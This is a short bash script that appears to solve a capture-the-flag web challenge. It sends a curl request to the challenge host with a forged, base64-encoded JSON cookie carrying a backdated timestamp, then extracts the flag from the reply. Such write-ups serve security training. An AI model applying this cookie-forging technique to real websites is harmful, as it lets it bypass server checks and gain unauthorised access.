#!/bin/bash

curl -s "http://chal.ctf.games:30484/" --cookie "in_oven=eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzAxLzIwMjMsIDEyOjAwOjAwIn0g" | grep -oE "flag{.*?}" --color=none\n
